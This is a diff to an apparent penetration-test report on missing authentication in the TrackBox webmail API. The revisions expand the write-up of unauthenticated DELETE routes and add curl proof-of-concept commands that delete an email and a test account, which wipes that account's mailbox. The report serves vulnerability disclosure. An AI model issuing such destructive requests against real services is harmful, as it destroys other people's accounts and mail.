@@ -3,7 +3,7 @@
 Missing authentication on destructive methods (CWE-306 / CWE-862) of the TrackBox webmail API. Two object-level `DELETE` routes are reachable with no session, `Authorization` header, CSRF token, or ownership check:
 
 1. `DELETE /api/emails/<id>` — permanently deletes any email by numeric id.
-2. `DELETE /api/users/<username>` — permanently deletes any webmail account by username.
+2. `DELETE /api/users/<username>` — permanently deletes any webmail account by username, **and** every email addressed to it (`Database.delete_email_by_id()` runs `DELETE FROM Emails WHERE Destination = ?`), wiping the whole mailbox in one request.
 
 Combined with the unauthenticated `GET /api/users` and `GET /api/emails` (which disclose every identifier), an attacker does not even need to guess ids — the API hands them over. This adds direct **integrity** and **availability** impact on top of the read/write exposure of the same surface.
 
@@ -13,10 +13,11 @@ All steps below use only attacker-created PoC objects to avoid touching real dat
 
 | Step | Action | Result |
 |------|--------|--------|
-| 1 | `POST /api/emails` to create a controlled test email. | Email id assigned (e.g. `86`). |
-| 2 | `OPTIONS /api/emails/86`. | `Allow: DELETE, OPTIONS, GET, HEAD` — DELETE offered, no auth. |
-| 3 | `DELETE /api/emails/86`. | `200 {"message":"Email deleted successfully"}`. |
-| 4 | Same flow on `DELETE /api/users/<username>`. | Arbitrary account deletion. |
+| 1 | `POST /api/emails` to create a controlled test email. | `201 {"message":"Email sent successfully"}` — the response does not contain the id. |
+| 2 | `GET /api/emails?user=<destination>` (unauthenticated). | The new email and its numeric id are listed (e.g. `86`). |
+| 3 | `OPTIONS /api/emails/86`. | `Allow: DELETE, GET, OPTIONS, HEAD` — DELETE offered, no auth. |
+| 4 | `DELETE /api/emails/86`. | `200 {"message":"Email deleted successfully","status":"success"}`. |
+| 5 | `DELETE /api/users/<username>` on a test account. | `200 {"message":"User deleted successfully","status":"success"}`; account and all its received emails are gone. |
 
 # PoC
 
@@ -33,7 +34,8 @@ curl -sk -X DELETE http://webmail.<TARGET>/api/emails/86 -i
 Verification that the object is gone:
 
 ```bash
-curl -sk http://webmail.<TARGET>/api/emails/86
+curl -sk http://webmail.<TARGET>/api/emails/86 -i
+# HTTP/1.1 404 NOT FOUND
 # {"message":"Email not found","status":"error"}
 ```
 
@@ -45,6 +47,10 @@ curl -sk http://webmail.<TARGET>/api/emails/86
 curl -sk -X DELETE http://webmail.<TARGET>/api/users/deleteprobe_1779619949@tbox.traced -i
 # HTTP/1.1 200 OK
 # {"message":"User deleted successfully","status":"success"}
+
+# The account's mailbox is deleted with it:
+curl -sk "http://webmail.<TARGET>/api/emails?user=deleteprobe_1779619949@tbox.traced"
+# {"count":0,"emails":[],"status":"success"}
 ```
 
 ![Unauthenticated user deletion succeeds](webmail-delete-user-unauthenticated-success.png)
